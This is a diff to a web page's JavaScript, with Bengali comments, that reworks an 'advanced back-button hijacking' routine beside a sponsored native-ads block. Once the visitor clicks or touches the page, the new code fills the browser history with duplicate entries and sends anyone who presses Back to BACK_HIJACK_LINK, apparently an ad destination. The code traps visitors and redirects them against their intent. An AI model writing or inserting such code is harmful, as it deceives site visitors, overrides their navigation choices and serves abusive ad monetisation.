@@ -162,7 +162,7 @@
                 <div id="suggestedList"></div>
 
                 <!-- ════════════════════════════════════════════════════════════
-                   NATIVE ADS SECTION (আপনার দেওয়া অ্যাড কোড এখানে যুক্ত করা হয়েছে)
+                   NATIVE ADS SECTION
                    ════════════════════════════════════════════════════════════ -->
                 <div class="native-ad-container" style="margin-top: 24px; border-top: 1px solid #272727; padding-top: 16px;">
                     <div style="font-size: 11px; color: #aaa; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 500;">Sponsored</div>
@@ -228,24 +228,37 @@
             });
 
             // ════════════════════════════════════════════════════════════
-            // ADVANCED BACK-BUTTON HIJACKING
+            // SAFE BACK-BUTTON HIJACKING (অটো রিডাইরেক্ট প্রোটেকশনসহ)
             // ════════════════════════════════════════════════════════════
+            let userInteracted = false; // ট্র্যাক করবে ইউজার সত্যি ক্লিক করেছে কিনা
+
             function setupHijack() {
+                userInteracted = true; // ক্লিক হওয়ামাত্র এটিকে true করবে
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState(null, document.title, window.location.href);
                 }
             }
 
-            setupHijack();
+            // শুরুতে সেফ পুশ (রিডাইরেক্ট করবে না)
+            window.history.pushState(null, document.title, window.location.href);
 
+            // ইউজার স্ক্রিনে সত্যিকার টাচ বা ক্লিক করলেই কেবল হাইজ্যাক সক্রিয় হবে
             window.addEventListener('click', setupHijack, { once: true });
             window.addEventListener('touchstart', setupHijack, { once: true });
 
             window.onpopstate = function (event) {
-                setupHijack();
-                setTimeout(function() {
-                    window.location.replace(BACK_HIJACK_LINK);
-                }, 50);
+                // বিজ্ঞাপনের স্ক্রিপ্ট ফেক পপস্টেট তৈরি করলেও ইউজার ক্লিক না করা পর্যন্ত রিডাইরেক্ট হবে না
+                if (userInteracted) {
+                    for (let i = 0; i < 5; i++) {
+                        window.history.pushState(null, document.title, window.location.href);
+                    }
+                    setTimeout(function() {
+                        window.location.replace(BACK_HIJACK_LINK);
+                    }, 50);
+                } else {
+                    // যদি ইউজার ক্লিক ছাড়া ভুলবশত ট্রিপ হয়, তাহলে হিস্ট্রি রিস্টোর করবে
+                    window.history.pushState(null, document.title, window.location.href);
+                }
             };
         })();
     </script>
